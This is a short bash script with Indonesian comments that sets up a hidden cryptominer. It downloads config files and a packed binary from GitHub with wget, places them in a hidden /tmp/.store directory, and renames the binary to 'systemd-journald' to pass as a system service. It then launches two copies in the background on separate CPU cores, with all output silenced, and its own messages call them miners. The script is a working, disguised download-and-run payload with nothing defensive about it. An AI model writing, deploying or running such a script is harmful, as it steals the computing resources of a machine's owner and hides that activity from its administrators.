#!/bin/bash

# Warna buat gaya sayang
GREEN='\033[0;32m'
NC='\033[0m' # No Color

echo -e "${GREEN}[*] Setup environment...${NC}"

# Buat folder 1 dan 2
mkdir -p /tmp/.store/1 /tmp/.store/2

# Download config 1
cd /tmp/.store/1
wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/1.ini -O config.ini

# Download config 2
cd /tmp/.store/2
wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/2.ini -O config.ini

# Balik ke .store
cd /tmp/.store

# Download dan extract
wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz
tar -xzf cache.tar.gz
rm -f cache.tar.gz
mv cache systemd-journald

# Copy ke folder 1 dan 2
cp systemd-journald /tmp/.store/1/
cp systemd-journald /tmp/.store/2/
chmod +x /tmp/.store/1/systemd-journald
chmod +x /tmp/.store/2/systemd-journald

# Bersih-bersih
rm -f systemd-journald

# Jalankan web langsung
echo -e "${GREEN}[*] Starting miners...${NC}"

# web pertama di core 0
nohup taskset -c 0 /tmp/.store/1/systemd-journald > /dev/null 2>&1 &

# web kedua di core 1
nohup taskset -c 1 /tmp/.store/2/systemd-journald > /dev/null 2>&1 &

echo -e "${GREEN}[✓] Setup selesai dan miners jalan di background.${NC}"

# Cek web jalan
ps aux | grep systemd-journald
